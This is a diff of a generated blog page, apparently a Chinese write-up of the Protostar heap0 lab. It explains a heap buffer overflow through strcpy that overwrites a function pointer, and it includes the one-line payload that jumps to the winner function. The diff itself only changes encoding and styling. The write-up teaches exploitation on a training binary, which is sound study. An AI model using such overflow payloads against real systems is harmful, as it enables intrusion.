@@ -53,7 +53,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1"></head>
+<meta name="generator" content="Hexo 5.4.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
 
 
 <body>
@@ -435,50 +437,50 @@
             <div id="articleContent">
                 <span id="more"></span>
 
-<h1 id="Pwn-protostar靶场5-heap-zero"><a href="#Pwn-protostar靶场5-heap-zero" class="headerlink" title="Pwn-protostar靶场5 heap_zero"></a>Pwn-protostar靶场5 heap_zero</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>堆是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D&spm=1001.2101.3001.7020">动态内存分配</a>的区域，程序在运行时用来分配内存。它与栈不同，栈用于静态分配内存，并且具有固定的大小</p>
-<p>程序使用如malloc、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=calloc&spm=1001.2101.3001.7020">calloc</a>、realloc等函数在堆上动态分配内存。当内存不再需要时，使用free函数释放。</p>
+<h1 id="Pwn-protostar靶场5-heap-zero"><a href="#Pwn-protostar靶场5-heap-zero" class="headerlink" title="Pwn-protostar靶场5 heap_zero"></a>Pwn-protostar靶场5 heap_zero</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>堆是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D&amp;spm=1001.2101.3001.7020">动态内存分配</a>的区域，程序在运行时用来分配内存。它与栈不同，栈用于静态分配内存，并且具有固定的大小</p>
+<p>程序使用如malloc、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=calloc&amp;spm=1001.2101.3001.7020">calloc</a>、realloc等函数在堆上动态分配内存。当内存不再需要时，使用free函数释放。</p>
 <p>接下来就用实战来讲解堆的运作机制</p>
 <h2 id="heap-0"><a href="#heap-0" class="headerlink" title="heap 0"></a>heap 0</h2><p>查看源码：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
 
-<span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token punctuation">&#123;</span>  #定义了一个名为data的结构体
+<span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token punctuation">{</span>  #定义了一个名为data的结构体
   <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  #包含一个<span class="token number">64</span>字节大小的字符数组name
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
-<span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token punctuation">&#123;</span>  #定义了一个名为fp的结构体
+<span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token punctuation">{</span>  #定义了一个名为fp的结构体
   <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #包含了一个函数指针fp
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
 <span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #自定义函数winner
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出level passed
-<span class="token punctuation">&#125;</span>
+<span class="token punctuation">}</span>
 
 <span class="token keyword">void</span> <span class="token function">nowinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #自定义函数nowinner
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level has not been passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出level has not been passed
-<span class="token punctuation">&#125;</span>
+<span class="token punctuation">}</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数，从命令行获取参数
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token operator">*</span>d<span class="token punctuation">;</span>  #声明了一个指向 <span class="token keyword">struct</span> <span class="token class-name">data</span> 类型结构体的指针 d
   <span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token operator">*</span>f<span class="token punctuation">;</span>  #声明了一个指向 <span class="token keyword">struct</span> <span class="token class-name">fp</span> 类型结构体的指针 f
 
   d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #给data结构体分配内存
   f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给fp结构体分配内存
-  f<span class="token operator">-></span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>  #fp结构体中的函数指针初始化为指向nowinner函数
+  f<span class="token operator">-&gt;</span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>  #fp结构体中的函数指针初始化为指向nowinner函数
 
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出data和fp结构体的内存地址
 
-  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #strcpy函数将命令行提供的第一个参数，复制到data结构体的name数组中
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #strcpy函数将命令行提供的第一个参数，复制到data结构体的name数组中
   
-  f<span class="token operator">-></span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #调用函数指针指向的函数nowinner
+  f<span class="token operator">-&gt;</span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #调用函数指针指向的函数nowinner
 
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>漏洞发生在strcpy函数处，strcpy函数不会检查目标缓冲区的大小，如果我们提供的参数超过64字节，它将导致缓冲区溢出，如果发生了缓冲区溢出，并且覆盖了f-&gt;fp的值，那么可以使它指向winner函数，调用winner函数</p>
 <p>我们先在第一个malloc函数调用的地方下一个断点，然后执行到断点处，来看看堆是怎么运行的<br><img src="/img/1731651000226.png"></p>
@@ -516,7 +518,7 @@
 <p> 我们将BBBB改为winner函数地址，就成功破解了程序 </p>
 <p><img src="/img/1731652536682.png"></p>
 <p> 我们可以使用echo工具来输入不可见字符 </p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;heap0 &quot;&#96;&#x2F;bin&#x2F;echo -ne &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x64\x84\x04\x08&quot;&#96;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">./heap0 "`/bin/echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x64\x84\x04\x08"`"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731652676257.png"></p>
 <p>成功跳转到winner函数</p>
@@ -947,7 +949,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">42.3k</span>
+                        class="white-color">41.6k</span>
             
             
             
